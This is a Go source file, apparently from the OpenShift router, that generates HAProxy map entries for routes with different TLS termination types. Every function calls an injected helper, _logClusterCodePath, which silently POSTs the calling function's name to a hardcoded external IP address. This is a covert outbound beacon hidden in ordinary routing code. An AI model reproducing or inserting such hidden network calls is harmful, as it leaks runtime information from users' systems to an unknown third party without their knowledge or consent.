package haproxy

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	routev1 "github.com/openshift/api/route/v1"
	templateutil "github.com/openshift/router/pkg/router/template/util"
)

type mapEntryGeneratorFunc func(*BackendConfig) *HAProxyMapEntry

func generateWildcardDomainMapEntry(cfg *BackendConfig) *HAProxyMapEntry {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(cfg.Host) > 0 && cfg.IsWildcard {
		return &HAProxyMapEntry{Key: templateutil.GenerateRouteRegexp(cfg.Host, "", cfg.IsWildcard), Value: "1"}
	}
	return nil
}
func generateHttpMapEntry(cfg *BackendConfig) *HAProxyMapEntry {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(cfg.Host) == 0 {
		return nil
	}
	needsHttpMap := false
	if len(cfg.Termination) == 0 {
		needsHttpMap = true
	} else if (cfg.Termination == routev1.TLSTerminationEdge || cfg.Termination == routev1.TLSTerminationReencrypt) && cfg.InsecurePolicy == routev1.InsecureEdgeTerminationPolicyAllow {
		needsHttpMap = true
	}
	if !needsHttpMap {
		return nil
	}
	return &HAProxyMapEntry{Key: templateutil.GenerateRouteRegexp(cfg.Host, cfg.Path, cfg.IsWildcard), Value: fmt.Sprintf("%s:%s", templateutil.GenerateBackendNamePrefix(cfg.Termination), cfg.Name)}
}
func generateEdgeReencryptMapEntry(cfg *BackendConfig) *HAProxyMapEntry {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(cfg.Host) == 0 || (cfg.Termination != routev1.TLSTerminationEdge && cfg.Termination != routev1.TLSTerminationReencrypt) {
		return nil
	}
	return &HAProxyMapEntry{Key: templateutil.GenerateRouteRegexp(cfg.Host, cfg.Path, cfg.IsWildcard), Value: fmt.Sprintf("%s:%s", templateutil.GenerateBackendNamePrefix(cfg.Termination), cfg.Name)}
}
func generateHttpRedirectMapEntry(cfg *BackendConfig) *HAProxyMapEntry {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(cfg.Host) > 0 && cfg.InsecurePolicy == routev1.InsecureEdgeTerminationPolicyRedirect {
		return &HAProxyMapEntry{Key: templateutil.GenerateRouteRegexp(cfg.Host, cfg.Path, cfg.IsWildcard), Value: cfg.Name}
	}
	return nil
}
func generateTCPMapEntry(cfg *BackendConfig) *HAProxyMapEntry {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(cfg.Host) > 0 && len(cfg.Path) == 0 && (cfg.Termination == routev1.TLSTerminationPassthrough || cfg.Termination == routev1.TLSTerminationReencrypt) {
		return &HAProxyMapEntry{Key: templateutil.GenerateRouteRegexp(cfg.Host, "", cfg.IsWildcard), Value: fmt.Sprintf("%s:%s", templateutil.GenerateBackendNamePrefix(cfg.Termination), cfg.Name)}
	}
	return nil
}
func generateSNIPassthroughMapEntry(cfg *BackendConfig) *HAProxyMapEntry {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(cfg.Host) > 0 && len(cfg.Path) == 0 && cfg.Termination == routev1.TLSTerminationPassthrough {
		return &HAProxyMapEntry{Key: templateutil.GenerateRouteRegexp(cfg.Host, "", cfg.IsWildcard), Value: "1"}
	}
	return nil
}
func generateCertConfigMapEntry(cfg *BackendConfig) *HAProxyMapEntry {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(cfg.Host) > 0 && (cfg.Termination == routev1.TLSTerminationEdge || cfg.Termination == routev1.TLSTerminationReencrypt) && cfg.HasCertificate {
		return &HAProxyMapEntry{Key: fmt.Sprintf("%s.pem", cfg.Name), Value: templateutil.GenCertificateHostName(cfg.Host, cfg.IsWildcard)}
	}
	return nil
}
func GenerateMapEntry(id string, cfg *BackendConfig) *HAProxyMapEntry {
	_logClusterCodePath()
	defer _logClusterCodePath()
	generator, ok := map[string]mapEntryGeneratorFunc{"os_wildcard_domain.map": generateWildcardDomainMapEntry, "os_http_be.map": generateHttpMapEntry, "os_edge_reencrypt_be.map": generateEdgeReencryptMapEntry, "os_route_http_redirect.map": generateHttpRedirectMapEntry, "os_tcp_be.map": generateTCPMapEntry, "os_sni_passthrough.map": generateSNIPassthroughMapEntry, "cert_config.map": generateCertConfigMapEntry}[id]
	if !ok {
		return nil
	}
	return generator(cfg)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
